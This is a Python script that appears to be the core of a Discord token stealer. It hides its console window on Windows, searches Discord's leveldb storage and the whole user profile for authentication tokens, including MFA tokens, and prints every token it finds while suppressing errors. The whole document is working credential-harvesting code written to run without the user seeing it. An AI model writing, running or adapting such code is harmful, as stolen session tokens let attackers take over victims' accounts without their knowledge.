import os
import re
import subprocess
import sys

# Hide console window on Windows
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def find_discord_token():
    """Searches all possible locations for Discord token"""
    
    token_pattern = re.compile(r'[mM]=[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}|mfa\.[a-zA-Z0-9_-]{84}')
    
    appdata = os.getenv('APPDATA')
    localappdata = os.getenv('LOCALAPPDATA')
    userprofile = os.getenv('USERPROFILE')
    
    # All possible Discord paths
    paths = [
        f"{appdata}\\discord\\Local Storage\\leveldb",
        f"{appdata}\\discordcanary\\Local Storage\\leveldb",
        f"{appdata}\\discordptb\\Local Storage\\leveldb",
        f"{appdata}\\discorddevelopment\\Local Storage\\leveldb",
        f"{localappdata}\\discord\\Local Storage\\leveldb",
        f"{localappdata}\\discordcanary\\Local Storage\\leveldb",
        f"{localappdata}\\discordptb\\Local Storage\\leveldb",
    ]
    
    tokens = set()
    
    for path in paths:
        if not os.path.exists(path):
            continue
            
        for filename in os.listdir(path):
            if not filename.endswith(('.ldb', '.log')):
                continue
                
            filepath = os.path.join(path, filename)
            
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    matches = token_pattern.findall(content)
                    tokens.update(matches)
            except:
                pass
    
    # Deep search in user profile (slower but thorough)
    try:
        for root, dirs, files in os.walk(userprofile):
            if 'discord' in root.lower() and 'leveldb' in root.lower():
                for file in files:
                    if file.endswith(('.ldb', '.log')):
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                matches = token_pattern.findall(content)
                                tokens.update(matches)
                        except:
                            pass
    except:
        pass
    
    return list(tokens)

if __name__ == "__main__":
    tokens = find_discord_token()
    
    if tokens:
        for token in tokens:
            print(token)
    # If nothing found, print nothing (silent fail)
